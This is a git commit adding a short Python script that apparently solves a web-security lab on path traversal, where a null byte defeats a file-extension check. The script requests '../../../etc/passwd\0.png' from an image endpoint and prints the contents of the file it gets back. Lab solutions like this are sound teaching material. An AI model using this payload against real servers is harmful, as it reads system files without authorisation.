307e7aad679da1a7df3c94ae4f4a40ef8db652fb
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-01-14 16:15:45 -0800

    File path traversal, validation of file extension with null byte bypass

---
+++ web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass.py
@@ -0,0 +1,17 @@
+from ..utils import *
+from urllib.parse import urlencode
+
+
+def solve_lab(session):
+    path = "/image"
+    params = { "filename": "../../../etc/passwd\0.png" }
+
+    print_info(f"Exploiting path traversal vulnerability by visiting \"{path}?{urlencode(params)}\"...")
+    resp = session.get_path(path, params=params)
+
+    if resp.status_code != 200:
+        print_fail("Unable to get contents of file.")
+    else:
+        print_success("GET request came back with the following response:")
+        print(resp.text)
+
